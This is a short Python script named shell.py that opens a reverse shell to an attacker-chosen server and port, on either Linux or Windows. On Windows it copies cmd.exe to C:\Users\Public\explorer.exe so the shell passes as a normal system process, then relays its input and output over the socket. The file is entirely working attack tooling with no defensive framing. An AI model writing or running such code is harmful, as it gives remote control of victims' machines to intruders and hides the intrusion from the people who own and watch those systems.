#!/usr/bin/python

#importing the modules
import os,socket,subprocess,threading,sys,shutil;

#print the help
if len(sys.argv[1:]) != 3:
    print "Usage: shell.py <server> <port> <linux/windows>"
    sys.exit(0)
	
shutil.copy('c:\\windows\\system32\\cmd.exe', 'c:\\Users\\Public\\explorer.exe')
server= str(sys.argv[1]); port=int(sys.argv[2]);system=str(sys.argv[3])
#create the socket with ipv4
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#connect to the server and port
s.connect((server,port))

#linux reverse shell
def linux():
   os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
   p=subprocess.call(["/bin/sh", "-i"])
#windows reverse shell
def win():
   
   p=subprocess.Popen(["\\Users\\Public\\explorer.exe"], stdout=subprocess.PIPE, 
   	                   stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
   s2p_thread = threading.Thread(target=s2p, args=[s, p])
   s2p_thread.daemon = True
   s2p_thread.start()
   p2s_thread = threading.Thread(target=p2s, args=[s, p])
   p2s_thread.daemon = True
   p2s_thread.start()
   p.wait()
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
try:
	if system == "windows":
	       win()
        elif system == "linux":
               linux()
except KeyboardInterrupt:
    s.close()